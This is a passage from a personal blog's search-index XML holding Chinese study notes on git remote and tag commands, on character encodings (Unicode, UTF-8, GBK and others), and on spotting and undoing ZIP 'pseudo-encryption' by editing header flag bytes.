bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git remote//查看远程库的信息</span><br><span class="line">git remote -v//显示更详细的信息</span><br><span class="line">git checkout -b branch-name origin/branch-name//在本地创建和远程分支对应的分支</span><br><span class="line">git branch --set-upstream branch-name origin/branch-name//建立本地分支和远程分支的关联</span><br><span class="line">git pull//如果使用git push推送失败，因为远程分支比本地的新，使用git pull试图合并</span><br></pre></td></tr></table></figure><p>如果合并有冲突，则解决冲突，并在本地提交</p><p>没有冲突之后，再重新推送</p><h1 id="标签管理"><a href="#标签管理" class="headerlink" title="标签管理"></a>标签管理</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git switch master//切换到需要打标签的分支上</span><br><span class="line">git tag name//打一个新标签名字为name</span><br><span class="line">git tag//查看所有标签</span><br></pre></td></tr></table></figure><p>默认标签是打在最新提交的commit上的。有时候，如果忘了打标签，比如，现在已经是周五了，但应该在周一打的标签没有打，怎么办？</p><p>方法是找到历史提交的commit id，然后打上就可以了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span> --pretty=oneline --abbrev-commit//查看commit id</span><br><span class="line">git tag name commit_id//打标签</span><br></pre></td></tr></table></figure><p>标签不是按时间顺序列出的，而是按字母排序的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git show tagname//查看标签信息</span><br></pre></td></tr></table></figure><p>还可以建立带有说明的标签，<code>-a</code>指定标签名，<code>-m</code>指定说明文字。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag -a name -m <span class="string">&quot;xxx&quot;</span> commit_id</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git tag -d name//删除标签</span><br><span class="line">git push origin name//推送某个标签到远程</span><br><span class="line">git push origin --tags//推送全部标签到远程</span><br></pre></td></tr></table></figure><p>如果已经推送到远程，删除标签要麻烦一些</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git tag -d name//删除本地</span><br><span class="line">git push origin :refs/tags/name//删除远程</span><br></pre></td></tr></table></figure><h1 id="使用github"><a href="#使用github" class="headerlink" title="使用github"></a>使用github</h1><p>参加开源项目，需要先点击fork，在自己账号下克隆一个仓库，然后从自己的账号下clone。</p><p>一定要从自己的账号下clone仓库，这样才能推送修改。</p><p>如果想让官方库接受你的修改，你可以在github上发起一个pull request。</p><blockquote><p>学习链接:<a href="https://www.liaoxuefeng.com/wiki/896043488029600">https://www.liaoxuefeng.com/wiki/896043488029600</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 2020年2月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[学习笔记] 编码</title>
      <link href="/2020/01/31/%E7%BC%96%E7%A0%81/"/>
      <url>/2020/01/31/%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>Unicode是国际标准化组织(iso)制定的可以容纳世界上所有文字和符号的字符编码方案。</p><p>Unicode是一个字符集，包含世界各个国家的各个文字的二级制代码</p><p>Unicode最初使用两个字节的十六进制数字表示字符编号，后来随着字符集的扩大，字符编号也需要三个字节或以上的十六进制数字表示。</p><p>UTF-8和UTF-16和UTF-32，是Unicode字符集的实现方式(编码规则)</p><p>UTF意思是unicode转换格式（Unicode transform format）</p><p><strong>ASCII码</strong>：一个英文字母（不分大小写）占一个字节的空间。一个二进制数字序列，在计算机中作为一个数字单元，一般为8位二进制数。换算为十进制，最小值-128，最大值127。如一个ASCII码就是一个字节。</p><blockquote><p>八位的字节一共可以组合出256(2的8次方)种不同的状态。<br>他们把其中的编号从0开始的32种状态分别规定了特殊的用途，一但终端、打印机遇上约定好的这些字节被传过来时，就要做一些约定的动作：</p><p>遇上0×10, 终端就换行；</p><p>遇上0×07, 终端就向人们嘟嘟叫；</p><p>遇上0x1b, 打印机就打印反白的字，或者终端就用彩色显示字母。</p><p>他们看到这样很好，于是就把这些0×20以下的字节状态称为”控制码”。他们又把所有的空格、标点符号、数字、大小写字母分别用连续的字节状态表示，一直编到了第127号，这样计算机就可以用不同字节来存储英语的文字了。大家看到这样，都感觉很好，于是大家都把这个方案叫做<strong>ANSI</strong>(ANSI编码是一种对ASCII码的拓展)的”Ascii”编码（American Standard Code for Information Interchange，美国信息互换标准代码）。当时世界上所有的计算机都用同样的<strong>ASCII</strong>方案来保存英文文字。</p></blockquote><p><strong>UTF-16编码</strong>：UTF-16通常用两个字节表示一个字符，原有的英文编码从单字节变成了双字节，原来的英文编码把高位字节的全部填成了0。</p><p>UTF-16的弊端：浪费存储空间，A一个字节就可以存储，utf16的话需要字节对齐，也就是2个字节，因此utf-8出现</p><p><strong>UTF-8编码</strong>：它是一种变长的编码方式。它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度，当字符在ASCII码的范围时，就用一个字节表示，保留了ASCII字符一个字节的编码做为它的一部分，注意的是UTF-8的汉字一般为三字节</p><blockquote><ol><li><p> 单字节的字符，字节的第一位设为0，对于英语文本，UTF-8码只占用一个字节，和ASCII码完全相同；</p></li><li><p> n个字节的字符(n&gt;1)，第一个字节的前n位设为1，第n+1位设为0，后面字节的前两位都设为10，这n个字节的其余空位填充该字符unicode码，高位用0补足。</p></li></ol><p>   解读 UTF-8 编码非常简单。如果一个字节的第一位是0，则这个字节单独就是一个字符；如果第一位是1，则连续有多少个1，就表示当前字符占用多少个字节。</p></blockquote><p><strong>UTF-32编码</strong>：以4个字节表示一个字符</p><blockquote><p>8、16、32可看做每种字符编码存储所需的最少的比特位数</p></blockquote><p><strong>GB2312编码</strong>：中国国家标准简体中文字符集，是对ASCII编码的扩展，收录6763个汉字和682个特殊符号，双字节表示中文字符，其余和ASCII兼容，一个字节表示。解码的时候，当遇到1开头的字节，就把两个字节合起来解释为一个字符。</p><p><strong>GBK编码</strong>：GBK 共收入 21886 个汉字和图形符号，GBK 向下与 GB2312 完全兼容，向上支持 ISO 10646 国际标准。</p><p><strong>GB18030编码</strong>：GB 18030 与 GB 2312-1980 和 GBK 兼容，共收录汉字70244个。与 UTF-8 相同，采用多字节编码，每个字可以由 1 个、2 个或 4 个字节组成</p>]]></content>
      
      
      <categories>
          
          <category> 2020年1月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[学习笔记] zip伪加密</title>
      <link href="/2019/11/08/zip%E4%BC%AA%E5%8A%A0%E5%AF%86/"/>
      <url>/2019/11/08/zip%E4%BC%AA%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包。 </p><p>50 4b 03 04 头文件标记<br>14 00解压文件所需 pkware 版本<br>00 00全局方式位标记（有无加密） </p><p>50 4b 01 02目录中文件头标记<br>3F 00压缩使用的 pkware 版本<br>14 00解压文件所需 pkware 版本<br>00 00全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）  </p><p><img src="https://i.loli.net/2019/11/08/jxlJ86snOMXADcp.png" alt="image-20191108124206161.png"></p><p>这里有多种方式解决伪加密</p><p>windows中可以通过下载winhex来进行16进制编辑</p><p>linux可以使用vim</p><p>在vim中使用**:%!xxd**打开16进制</p><p>使用**:%!xxd -r**恢复</p><h1 id="无加密"><a href="#无加密" class="headerlink" title="无加密"></a>无加密</h1><p>压缩源文件数据区的全局加密应当为<code>00 00</code><br>且压缩源文件目录区的全局方式位标记应当为<code>00 00</code></p><h1 id="假加密"><a href="#假加密" class="headerlink" title="假加密"></a>假加密</h1><p>压缩源文件数据区的全局加密应当为<code>00 00</code><br>且压缩源文件目录区的全局方式位标记应当为<code>09 00</code></p><h1 id="真加密"><a href="#真加密" class="headerlink" title="真加密"></a>真加密</h1><p>压缩源文件数据区的全局加密应当为<code>09 00</code><br>且压缩源文件目录区的全局方式位标记应当为<code>09 00</code></p><p>参考 ：<a href="https://blog.csdn.net/u011377996/article/details/79286958">https://blog.csdn.net/u011377996/article/details/79286958</a> </p>]]></content>
      
      
      <categories>
          
          <category> 2019年11月 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
